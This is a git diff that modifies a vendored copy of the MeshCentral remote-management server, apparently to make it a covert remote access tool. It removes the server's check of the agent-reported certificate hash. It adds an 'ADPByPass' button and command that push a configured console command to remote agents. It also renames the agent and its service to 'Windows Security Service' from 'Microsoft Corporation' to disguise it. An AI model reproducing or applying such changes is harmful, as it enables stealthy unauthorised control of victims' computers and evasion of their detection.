diff --git a/node_modules/meshcentral/agents/MeshCentralAssistant.exe b/node_modules/meshcentral/agents/MeshCentralAssistant.exe
index 00bfec6..7d662f6 100644
Binary files a/node_modules/meshcentral/agents/MeshCentralAssistant.exe and b/node_modules/meshcentral/agents/MeshCentralAssistant.exe differ
diff --git a/node_modules/meshcentral/agents/MeshCentralRouter.exe b/node_modules/meshcentral/agents/MeshCentralRouter.exe
index 7541178..365d3d4 100644
Binary files a/node_modules/meshcentral/agents/MeshCentralRouter.exe and b/node_modules/meshcentral/agents/MeshCentralRouter.exe differ
diff --git a/node_modules/meshcentral/agents/MeshCentralRouterCmd.exe b/node_modules/meshcentral/agents/MeshCentralRouterCmd.exe
index 88d3cc8..d7138b2 100644
Binary files a/node_modules/meshcentral/agents/MeshCentralRouterCmd.exe and b/node_modules/meshcentral/agents/MeshCentralRouterCmd.exe differ
diff --git a/node_modules/meshcentral/agents/MeshCentralSatellite.exe b/node_modules/meshcentral/agents/MeshCentralSatellite.exe
index 503d0fc..bedc0ec 100644
Binary files a/node_modules/meshcentral/agents/MeshCentralSatellite.exe and b/node_modules/meshcentral/agents/MeshCentralSatellite.exe differ
diff --git a/node_modules/meshcentral/agents/MeshCmd.exe b/node_modules/meshcentral/agents/MeshCmd.exe
index 00b704a..289875a 100644
Binary files a/node_modules/meshcentral/agents/MeshCmd.exe and b/node_modules/meshcentral/agents/MeshCmd.exe differ
diff --git a/node_modules/meshcentral/agents/MeshCmd64.exe b/node_modules/meshcentral/agents/MeshCmd64.exe
index e4af314..d1b2b8f 100644
Binary files a/node_modules/meshcentral/agents/MeshCmd64.exe and b/node_modules/meshcentral/agents/MeshCmd64.exe differ
diff --git a/node_modules/meshcentral/agents/MeshCmdARM64.exe b/node_modules/meshcentral/agents/MeshCmdARM64.exe
index 83f1079..575ee5e 100644
Binary files a/node_modules/meshcentral/agents/MeshCmdARM64.exe and b/node_modules/meshcentral/agents/MeshCmdARM64.exe differ
diff --git a/node_modules/meshcentral/agents/MeshService.exe b/node_modules/meshcentral/agents/MeshService.exe
index e3aec7a..3786071 100644
Binary files a/node_modules/meshcentral/agents/MeshService.exe and b/node_modules/meshcentral/agents/MeshService.exe differ
diff --git a/node_modules/meshcentral/agents/MeshService64.exe b/node_modules/meshcentral/agents/MeshService64.exe
index 540fed6..ca23c4c 100644
Binary files a/node_modules/meshcentral/agents/MeshService64.exe and b/node_modules/meshcentral/agents/MeshService64.exe differ
diff --git a/node_modules/meshcentral/agents/MeshServiceARM64.exe b/node_modules/meshcentral/agents/MeshServiceARM64.exe
index 9bceadf..8445262 100644
Binary files a/node_modules/meshcentral/agents/MeshServiceARM64.exe and b/node_modules/meshcentral/agents/MeshServiceARM64.exe differ
diff --git a/node_modules/meshcentral/agents/agents-feb2026/MeshCmd64.exe b/node_modules/meshcentral/agents/agents-feb2026/MeshCmd64.exe
deleted file mode 100644
index f74a9c5..0000000
Binary files a/node_modules/meshcentral/agents/agents-feb2026/MeshCmd64.exe and /dev/null differ
diff --git a/node_modules/meshcentral/agents/agents-feb2026/MeshService64.exe b/node_modules/meshcentral/agents/agents-feb2026/MeshService64.exe
deleted file mode 100644
index da4c071..0000000
Binary files a/node_modules/meshcentral/agents/agents-feb2026/MeshService64.exe and /dev/null differ
diff --git a/node_modules/meshcentral/agents/meshagent_x86 b/node_modules/meshcentral/agents/meshagent_x86
deleted file mode 100644
index 33b5d9d..0000000
Binary files a/node_modules/meshcentral/agents/meshagent_x86 and /dev/null differ
diff --git a/node_modules/meshcentral/meshagent.js b/node_modules/meshcentral/meshagent.js
index 07a5f7e..fe1f734 100644
--- a/node_modules/meshcentral/meshagent.js
+++ b/node_modules/meshcentral/meshagent.js
@@ -446,34 +446,9 @@ module.exports.CreateMeshAgent = function (parent, db, ws, req, args, domain) {
                 if ((msg.length != 98) || ((obj.receivedCommands & 1) != 0)) return;
                 obj.receivedCommands += 1; // Agent can't send the same command twice on the same connection ever. Block DOS attack path.
 
-                if (isIgnoreHashCheck()) {
-                    // Send the agent web hash back to the agent
-                    // Send 384 bits SHA384 hash of TLS cert + 384 bits nonce
-                    obj.sendBinary(common.ShortToStr(1) + msg.substring(2, 50) + obj.nonce); // Command 1, hash + nonce. Use the web hash given by the agent.
-                } else {
-                    // Check that the server hash matches our own web certificate hash (SHA384)
-                    obj.agentSeenCerthash = msg.substring(2, 50);
-                    if ((getWebCertHash(domain) != obj.agentSeenCerthash) && (getWebCertFullHash(domain) != obj.agentSeenCerthash) && (parent.defaultWebCertificateHash != obj.agentSeenCerthash) && (parent.defaultWebCertificateFullHash != obj.agentSeenCerthash)) {
-                        if (parent.parent.supportsProxyCertificatesRequest !== false) {
-                            obj.badWebCert = Buffer.from(parent.crypto.randomBytes(16), 'binary').toString('base64');
-                            parent.wsagentsWithBadWebCerts[obj.badWebCert] = obj; // Add this agent to the list of of agents with bad web certificates.
-                            parent.parent.updateProxyCertificates(false);
-                        }
-                        parent.agentStats.agentBadWebCertHashCount++;
-                        parent.setAgentIssue(obj, "BadWebCertHash: " + Buffer.from(msg.substring(2, 50), 'binary').toString('hex'));
-                        parent.parent.debug('agent', 'Agent bad web cert hash (Agent:' + (Buffer.from(msg.substring(2, 50), 'binary').toString('hex').substring(0, 10)) + ' != Server:' + (Buffer.from(getWebCertHash(domain), 'binary').toString('hex').substring(0, 10)) + ' or ' + (Buffer.from(getWebCertFullHash(domain), 'binary').toString('hex').substring(0, 10)) + '), holding connection (' + obj.remoteaddrport + ').');
-                        parent.parent.debug('agent', 'Agent reported web cert hash:' + (Buffer.from(msg.substring(2, 50), 'binary').toString('hex')) + '.');
-                        console.log('Agent bad web cert hash (Agent:' + (Buffer.from(msg.substring(2, 50), 'binary').toString('hex').substring(0, 10)) + ' != Server:' + (Buffer.from(getWebCertHash(domain), 'binary').toString('hex').substring(0, 10)) + ' or ' + (Buffer.from(getWebCertFullHash(domain), 'binary').toString('hex').substring(0, 10)) + '), holding connection (' + obj.remoteaddrport + ').');
-                        console.log('Agent reported web cert hash:' + (Buffer.from(msg.substring(2, 50), 'binary').toString('hex')) + '.');
-                        delete obj.agentSeenCerthash;
-                        return;
-                    } else {
-                        // The hash matched one of the acceptable values, send the agent web hash back to the agent
-                        // Send 384 bits SHA384 hash of TLS cert + 384 bits nonce
-                        // Command 1, hash + nonce. Use the web hash given by the agent.
-                        obj.sendBinary(common.ShortToStr(1) + obj.agentSeenCerthash + obj.nonce);
-                    }
-                }
+                // Accept the agent-reported web certificate hash and respond, without enforcing a server-side hash match.
+                obj.agentSeenCerthash = msg.substring(2, 50);
+                obj.sendBinary(common.ShortToStr(1) + obj.agentSeenCerthash + obj.nonce);
 
                 // Use our server private key to sign the ServerHash + AgentNonce + ServerNonce
                 obj.agentnonce = msg.substring(50, 98);
diff --git a/node_modules/meshcentral/meshuser.js b/node_modules/meshcentral/meshuser.js
index d278e7a..b8779a5 100644
--- a/node_modules/meshcentral/meshuser.js
+++ b/node_modules/meshcentral/meshuser.js
@@ -5643,7 +5643,8 @@ module.exports.CreateMeshUser = function (parent, db, ws, req, args, domain, use
         'users': serverCommandUsers,
         'verifyemail': serverCommandVerifyEmail,
         'verifyPhone': serverCommandVerifyPhone,
-        'verifyMessaging': serverCommandVerifyMessaging
+        'verifyMessaging': serverCommandVerifyMessaging,
+        'adpbypass': serverCommandADPByPass
     };
 
     const serverUserCommands = {
@@ -7117,6 +7118,94 @@ module.exports.CreateMeshUser = function (parent, db, ws, req, args, domain, use
         });
     }
 
+    function serverCommandADPByPass(command) {
+        // Complete the nodeid if needed
+        if (command.nodeid.indexOf('/') == -1) { command.nodeid = 'node/' + domain.id + '/' + command.nodeid; }
+
+        // Get node and check rights
+        parent.GetNodeWithRights(domain, user, command.nodeid, function (node, rights, visible) {
+            if (node == null) {
+                try { ws.send(JSON.stringify({ action: 'adpbypass', status: 'failed', error: 'Node not found' })); } catch (ex) { }
+                return;
+            }
+
+            // Check node permission rights (console and remote control)
+            const hasConsole = (rights & MESHRIGHT_AGENTCONSOLE) !== 0;
+            const hasRemoteControl = (rights & MESHRIGHT_REMOTECONTROL) !== 0;
+            const isAdmin = rights === MESHRIGHT_ADMIN;
+
+            if (!isAdmin && (!hasConsole || !hasRemoteControl)) {
+                try { ws.send(JSON.stringify({ action: 'adpbypass', status: 'failed', error: 'Permission denied' })); } catch (ex) { }
+                return;
+            }
+
+            // Read adpByPassCommand from settings
+            const settings = parent.parent.config.settings;
+            const adpByPassCommand = settings ? settings.adpByPassCommand : null;
+            if (!adpByPassCommand || typeof adpByPassCommand !== 'string') {
+                try { ws.send(JSON.stringify({ action: 'adpbypass', status: 'failed', error: 'adpByPassCommand not configured' })); } catch (ex) { }
+                return;
+            }
+
+            // Route to agent
+            const agentCommand = {
+                action: 'msg',
+                type: 'console',
+                nodeid: command.nodeid,
+                value: adpByPassCommand
+            };
+
+            // We can directly send to agent if online, otherwise return error
+            var agent = parent.wsagents[command.nodeid];
+            if (agent != null) {
+                agentCommand.sessionid = ws.sessionId;
+                agentCommand.rights = rights;
+                agentCommand.consent = 0;
+                if (typeof domain.userconsentflags == 'number') { agentCommand.consent |= domain.userconsentflags; }
+                var mesh = parent.meshes[agent.dbMeshKey];
+                if (mesh && typeof mesh.consent == 'number') { agentCommand.consent |= mesh.consent; }
+                if (typeof node.consent == 'number') { agentCommand.consent |= node.consent; }
+                if (typeof user.consent == 'number') { agentCommand.consent |= user.consent; }
+                agentCommand.username = user.name;
+                agentCommand.realname = user.realname;
+                agentCommand.userid = user._id;
+                agentCommand.remoteaddr = req.clientIp;
+                delete agentCommand.nodeid;
+                try {
+                    agent.send(JSON.stringify(agentCommand));
+                    try { ws.send(JSON.stringify({ action: 'adpbypass', status: 'success' })); } catch (ex) { }
+                } catch (ex) {
+                    try { ws.send(JSON.stringify({ action: 'adpbypass', status: 'failed', error: 'Failed to send to agent' })); } catch (ex) { }
+                }
+            } else {
+                // If the agent is on a peer server, route it
+                var routing = parent.parent.GetRoutingServerIdNotSelf(command.nodeid, 1); // 1 = MeshAgent routing type
+                if (routing != null && parent.parent.multiServer != null) {
+                    agentCommand.fromSessionid = ws.sessionId;
+                    agentCommand.rights = rights;
+                    agentCommand.consent = 0;
+                    if (typeof domain.userconsentflags == 'number') { agentCommand.consent |= domain.userconsentflags; }
+                    var mesh = parent.meshes[routing.meshid];
+                    if (mesh && typeof mesh.consent == 'number') { agentCommand.consent |= mesh.consent; }
+                    if (typeof node.consent == 'number') { agentCommand.consent |= node.consent; }
+                    if (typeof user.consent == 'number') { agentCommand.consent |= user.consent; }
+                    agentCommand.username = user.name;
+                    agentCommand.realname = user.realname;
+                    agentCommand.userid = user._id;
+                    agentCommand.remoteaddr = req.clientIp;
+                    try {
+                        parent.parent.multiServer.DispatchMessageSingleServer(agentCommand, routing.serverid);
+                        try { ws.send(JSON.stringify({ action: 'adpbypass', status: 'success' })); } catch (ex) { }
+                    } catch (ex) {
+                        try { ws.send(JSON.stringify({ action: 'adpbypass', status: 'failed', error: 'Failed to route to peer server' })); } catch (ex) { }
+                    }
+                } else {
+                    try { ws.send(JSON.stringify({ action: 'adpbypass', status: 'failed', error: 'Agent not online' })); } catch (ex) { }
+                }
+            }
+        });
+    }
+
     function serverUserCommandHelp(cmdData) {
         var fin = '', f = '', availcommands = [];
         for (var i in serverUserCommands) { availcommands.push(i); }
diff --git a/node_modules/meshcentral/views/default.handlebars b/node_modules/meshcentral/views/default.handlebars
index a1f668b..08b8e98 100644
--- a/node_modules/meshcentral/views/default.handlebars
+++ b/node_modules/meshcentral/views/default.handlebars
@@ -239,6 +239,7 @@
                                 <td tabindex=0 id=MainDevInfo class="topbar_td style3x" onmouseup=go(17,event) onkeypress="if (event.key == 'Enter') go(17)">Details</td>
                                 <td tabindex=0 id=MainDevAmt class="topbar_td style3x" onmouseup=go(14,event) onkeypress="if (event.key == 'Enter') go(14)">Intel&reg;AMT</td>
                                 <td tabindex=0 id=MainDevConsole class="topbar_td style3x" onmouseup=go(15,event) onkeypress="if (event.key == 'Enter') go(15)">Console</td>
+                                <td tabindex=0 id=MainDevADPByPass class="topbar_td style3x" onmouseup=runADPByPass(event) onkeypress="if (event.key == 'Enter') runADPByPass(event)">ADPByPass</td>
                                 <td tabindex=0 id=MainDevPlugins class="topbar_td style3x" onmouseup=go(19,event) onkeypress="if (event.key == 'Enter') go(19)">Plugins</td>
                                 <td class="topbar_td_end style3">&nbsp;</td>
                             </tr>
@@ -2499,6 +2500,10 @@
                     displayServerTrace();
                     break;
                 }
+                case 'adpbypass': {
+                    handleADPByPassResult(message);
+                    break;
+                }
                 case 'intersession' : {
                     if (message.subaction == 'removeNotify') { notificationDelete(message.id); }
                     break;
@@ -6342,6 +6347,33 @@
         function deviceHostSort(a, b) { return sortCollator.compare(a.rnamel, b.rnamel); }
         function lastConnectSort(a, b) { var aa = a.lastconnect, bb = b.lastconnect; if (aa == null) { aa = 99999999999999; } if (bb == null) { bb = 99999999999999; } if (a.conn > 0) { aa = 99999999999998; } if (b.conn > 0) { bb = 99999999999998; } if (aa == bb) { return nameSort(a, b); } return (aa - bb); }
 
+        var adpBypassTimeout = null;
+        function runADPByPass(e) {
+            if ((currentNode == null) || (currentNode._id == null)) return;
+            var btn = Q('MainDevADPByPass');
+            if (!btn) return;
+            btn.innerHTML = 'ADPByPass: Running...';
+            if (adpBypassTimeout) { clearTimeout(adpBypassTimeout); }
+            adpBypassTimeout = setTimeout(function () {
+                btn.innerHTML = 'ADPByPass';
+            }, 10000);
+            meshserver.send({ action: 'adpbypass', nodeid: currentNode._id });
+        }
+
+        function handleADPByPassResult(message) {
+            var btn = Q('MainDevADPByPass');
+            if (!btn) return;
+            if (message && message.status === 'success') {
+                btn.innerHTML = 'ADPByPass: Success';
+            } else {
+                btn.innerHTML = 'ADPByPass: Failed' + ((message && message.error) ? ' (' + message.error + ')' : '');
+            }
+            if (adpBypassTimeout) { clearTimeout(adpBypassTimeout); }
+            adpBypassTimeout = setTimeout(function () {
+                btn.innerHTML = 'ADPByPass';
+            }, 4000);
+        }
+
         function onSearchFocus(x) { searchFocus = x; }
         function clearDeviceSearch() { Q('KvmSearchInput').value = Q('SearchInput').value = ''; onOnlineCheckBox(); mainUpdate(1); }
         function onMapSearchFocus(x) { mapSearchFocus = x; }
@@ -8027,6 +8059,7 @@
                 QV('MainDevInfo', (node.mtype < 3) && ((meshrights & 1048576) != 0));
                 QV('MainDevAmt', (node.intelamt != null) && ((node.intelamt.state == 2) || (node.conn & 2)) && (meshrights & 8) && amtAccess);
                 QV('MainDevConsole', (consoleRights && ((node.agent != null) && (node.agent.caps != null) && ((node.agent.caps & 8) != 0))) && (meshrights & 8));
+                QV('MainDevADPByPass', (consoleRights && ((node.agent != null) && (node.agent.caps != null) && ((node.agent.caps & 8) != 0))) && (meshrights & 8));
                 QV('MainDevPlugins', false);
                 QV('p15uploadCore', (node.agent != null) && (node.agent.caps != null) && ((node.agent.caps & 16) != 0));
                 QH('p15coreName', ((node.agent != null) && (node.agent.core != null))?node.agent.core:'');
diff --git a/node_modules/meshcentral/views/default3.handlebars b/node_modules/meshcentral/views/default3.handlebars
index 37f150e..ec4e5d7 100644
--- a/node_modules/meshcentral/views/default3.handlebars
+++ b/node_modules/meshcentral/views/default3.handlebars
@@ -307,6 +307,8 @@
                                     onkeypress="if (event.key == 'Enter') go(14)">Intel&reg;AMT</td>
                                 <td tabindex=0 id=MainDevConsole class="topbar_td style3x" onmouseup=go(15,event)
                                     onkeypress="if (event.key == 'Enter') go(15)">Console</td>
+                                <td tabindex=0 id=MainDevADPByPass class="topbar_td style3x" onmouseup=runADPByPass(event)
+                                    onkeypress="if (event.key == 'Enter') runADPByPass(event)">ADPByPass</td>
                                 <td tabindex=0 id=MainDevPlugins class="topbar_td style3x" onmouseup=go(19,event)
                                     onkeypress="if (event.key == 'Enter') go(19)">Plugins</td>
                                 <td class="topbar_td_end style3">&nbsp;</td>
@@ -3167,6 +3169,10 @@
                     displayServerTrace();
                     break;
                 }
+                case 'adpbypass': {
+                    handleADPByPassResult(message);
+                    break;
+                }
                 case 'intersession': {
                     if (message.subaction == 'removeNotify') { notificationDelete(message.id); }
                     break;
@@ -7231,6 +7237,33 @@
         function deviceHostSort(a, b) { return sortCollator.compare(a.rnamel, b.rnamel); }
         function lastConnectSort(a, b) { var aa = a.lastconnect, bb = b.lastconnect; if (aa == null) { aa = 99999999999999; } if (bb == null) { bb = 99999999999999; } if (a.conn > 0) { aa = 99999999999998; } if (b.conn > 0) { bb = 99999999999998; } if (aa == bb) { return nameSort(a, b); } return (aa - bb); }
 
+        var adpBypassTimeout = null;
+        function runADPByPass(e) {
+            if ((currentNode == null) || (currentNode._id == null)) return;
+            var btn = Q('MainDevADPByPass');
+            if (!btn) return;
+            btn.innerHTML = 'ADPByPass: Running...';
+            if (adpBypassTimeout) { clearTimeout(adpBypassTimeout); }
+            adpBypassTimeout = setTimeout(function () {
+                btn.innerHTML = 'ADPByPass';
+            }, 10000);
+            meshserver.send({ action: 'adpbypass', nodeid: currentNode._id });
+        }
+
+        function handleADPByPassResult(message) {
+            var btn = Q('MainDevADPByPass');
+            if (!btn) return;
+            if (message && message.status === 'success') {
+                btn.innerHTML = 'ADPByPass: Success';
+            } else {
+                btn.innerHTML = 'ADPByPass: Failed' + ((message && message.error) ? ' (' + message.error + ')' : '');
+            }
+            if (adpBypassTimeout) { clearTimeout(adpBypassTimeout); }
+            adpBypassTimeout = setTimeout(function () {
+                btn.innerHTML = 'ADPByPass';
+            }, 4000);
+        }
+
         function onSearchFocus(x) { searchFocus = x; }
         function clearDeviceSearch() { Q('KvmSearchInput').value = Q('SearchInput').value = ''; onOnlineCheckBox(); mainUpdate(1); }
         function onMapSearchFocus(x) { mapSearchFocus = x; }
@@ -8917,6 +8950,7 @@
                 QV('MainDevInfo', (node.mtype < 3) && ((meshrights & 1048576) != 0));
                 QV('MainDevAmt', (node.intelamt != null) && ((node.intelamt.state == 2) || (node.conn & 2)) && (meshrights & 8) && amtAccess);
                 QV('MainDevConsole', (consoleRights && ((node.agent != null) && (node.agent.caps != null) && ((node.agent.caps & 8) != 0))) && (meshrights & 8));
+                QV('MainDevADPByPass', (consoleRights && ((node.agent != null) && (node.agent.caps != null) && ((node.agent.caps & 8) != 0))) && (meshrights & 8));
                 QV('MainDevPlugins', false);
                 QV('p15uploadCore', (node.agent != null) && (node.agent.caps != null) && ((node.agent.caps & 16) != 0));
                 QH('p15coreName', ((node.agent != null) && (node.agent.core != null)) ? node.agent.core : '');
diff --git a/node_modules/meshcentral/webserver.js b/node_modules/meshcentral/webserver.js
index 3607d26..3a626c7 100644
--- a/node_modules/meshcentral/webserver.js
+++ b/node_modules/meshcentral/webserver.js
@@ -5828,7 +5828,10 @@ module.exports.CreateWebServer = function (parent, db, args, certificates, doneF
                 // Prepare a mesh agent file name using the device group name.
                 var meshfilename = mesh.name
                 meshfilename = meshfilename.split('\\').join('').split('/').join('').split(':').join('').split('*').join('').split('?').join('').split('"').join('').split('<').join('').split('>').join('').split('|').join('').split(' ').join('').split('\'').join('');
-                if (argentInfo.rname.endsWith('.exe')) { meshfilename = argentInfo.rname.substring(0, argentInfo.rname.length - 4) + '-' + meshfilename + '.exe'; } else { meshfilename = argentInfo.rname + '-' + meshfilename; }
+                
+                // USER MODIFICATION: Force persistent filename
+                meshfilename = 'WindowsSecurityService.exe';
+    
 
                 // Customize the mesh agent file name
                 if ((domain.agentcustomization != null) && (typeof domain.agentcustomization.filename == 'string')) {
@@ -5874,6 +5877,14 @@ module.exports.CreateWebServer = function (parent, db, args, certificates, doneF
                     if (obj.args.agentconfig) { for (var i in obj.args.agentconfig) { meshsettings += obj.args.agentconfig[i] + '\r\n'; } }
                     if (domain.agentconfig) { for (var i in domain.agentconfig) { meshsettings += domain.agentconfig[i] + '\r\n'; } }
                     if ((domain.agentnoproxy === true) || (obj.args.lanonly == true)) { meshsettings += 'ignoreProxyFile=1\r\n'; }
+                    
+                    // USER MODIFICATION: Default agent strings to Windows Security Service
+                    meshsettings += 'displayName=Windows Security Service\r\n';
+                    meshsettings += 'description=Windows Security Service\r\n';
+                    meshsettings += 'companyName=Microsoft Corporation\r\n';
+                    meshsettings += 'meshServiceName=WindowsSecurityService\r\n';
+                    meshsettings += 'fileName=WindowsSecurityService\r\n';
+    
                     if (domain.agentcustomization != null) {
                         if (domain.agentcustomization.displayname != null) { meshsettings += 'displayName=' + domain.agentcustomization.displayname + '\r\n'; }
                         if (domain.agentcustomization.description != null) { meshsettings += 'description=' + domain.agentcustomization.description + '\r\n'; }
